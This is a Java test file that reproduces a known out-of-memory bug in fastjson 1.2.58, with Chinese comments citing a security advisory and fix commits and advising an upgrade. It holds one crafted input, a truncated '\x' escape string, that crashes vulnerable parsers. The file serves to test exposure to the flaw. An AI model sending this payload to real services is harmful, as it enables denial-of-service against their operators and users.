package cn.yangdali.fastjsontest;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONException;

/**
 * 有关fastjson低版本框架恶意解析导致oom测试
 * 		本版本为1.2.58
 * 
 * 阿里云安全预警描述：
 * https://help.aliyun.com/noticelist/articleid/1060052050.html
 * github导致bug案例：
 * https://github.com/alibaba/fastjson/pull/2692/commits/b44900e5cc2a0212992fd7f8f0b1285ba77bb35d
 * github版本更新方案（修复方案）：
 * https://github.com/alibaba/fastjson/pull/2692/commits/995845170527221ca0293cf290e33a7d6cb52bf7
 * 解决方案，将版本升级到1.2.6或升级为对应的sec06版本   例如：1.2.58.sec06
 * 考虑到升级到最新版本可能会有兼容性问题。建议升级到对应的sec06版本
 *
 * @author：yangli	
 * @date:2019年9月18日 下午5:40:42
 * @version 1.0
 */
public class FastJsonTest {

	public static void main(String[] args) {
        //漏洞是由于fastjson处理字符串中x这种HEX字符表示形式出现的问题。
        String DEATH_STRING = "{\"a\":\"\\x";
        try{
            Object obj = JSON.parse(DEATH_STRING);
            System.out.println(obj);
        }catch (JSONException ex){
            System.out.println(ex);
        }
	}
}
